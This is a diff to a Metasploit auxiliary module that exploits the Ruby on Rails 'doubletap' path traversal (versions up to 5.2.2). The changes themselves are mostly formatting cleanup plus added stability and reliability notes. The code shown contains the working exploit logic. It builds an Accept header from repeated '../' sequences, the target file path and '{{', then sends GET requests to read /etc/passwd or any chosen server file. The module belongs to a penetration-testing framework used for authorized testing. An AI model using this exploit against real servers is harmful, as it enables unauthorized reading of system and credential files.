@@ -10,18 +10,17 @@ class MetasploitModule < Msf::Auxiliary
     super(
       update_info(
         info,
-        'Name'        => "Ruby On Rails File Content Disclosure ('doubletap')",
+        'Name' => "Ruby On Rails File Content Disclosure ('doubletap')",
         'Description' => %q{
           This module uses a path traversal vulnerability in Ruby on Rails
           versions =< 5.2.2 to read files on a target server.
         },
-        'Author'      =>
-        [
+        'Author' => [
           'Carter Brainerd <0xCB@protonmail.com>', # Metasploit module
           'John Hawthorn <john@hawthorn.email>' # PoC/discovery
         ],
-        'License'     => MSF_LICENSE,
-        'References'     => [
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'URL', 'https://hackerone.com/reports/473888' ],
           [ 'URL', 'https://github.com/mpgn/Rails-doubletap-RCE' ],
           [ 'URL', 'https://groups.google.com/forum/#!topic/rubyonrails-security/pFRKI96Sm8Q' ],
@@ -30,7 +29,10 @@ class MetasploitModule < Msf::Auxiliary
           [ 'EDB', '46585' ]
         ],
         'Notes' => {
-          'AKA' => ['DoubleTap']
+          'AKA' => ['DoubleTap'],
+          'Stability' => UNKNOWN_STABILITY,
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
         }
       )
     )
@@ -53,11 +55,12 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_accept_header_value(depth, file)
-    return (('../'*depth) + file + '{{').gsub('//', '/')
+    return (('../' * depth) + file + '{{').gsub('//', '/')
   end
 
   def check
     return true if datastore['SkipCheck']
+
     # Check if target file is absolute path
     unless datastore['TARGET_FILE'].start_with? '/'
       vprint_error "TARGET_FILE must be an absolute path (eg. /etc/passwd)."
@@ -68,7 +71,7 @@ class MetasploitModule < Msf::Auxiliary
     res = send_request_cgi({
       'method' => 'GET',
       'uri' => normalize_uri(datastore['ROUTE']),
-      'headers' => { 'Accept' => get_accept_header_value(datastore['DEPTH'], '/etc/passwd')}
+      'headers' => { 'Accept' => get_accept_header_value(datastore['DEPTH'], '/etc/passwd') }
     })
 
     if res.nil?
@@ -92,13 +95,12 @@ class MetasploitModule < Msf::Auxiliary
 
     fail_with(Failure::BadConfig, 'TARGET_FILE must be an absolute path (eg. /etc/passwd).') unless datastore['TARGET_FILE'].start_with? '/'
 
-
     print_status "Requesting file #{datastore['TARGET_FILE']}"
 
     res = send_request_cgi({
       'method' => 'GET',
       'uri' => normalize_uri(datastore['ROUTE']),
-      'headers' => { 'Accept' => get_accept_header_value(datastore['DEPTH'], datastore['TARGET_FILE'])}
+      'headers' => { 'Accept' => get_accept_header_value(datastore['DEPTH'], datastore['TARGET_FILE']) }
     })
 
     if res.nil?
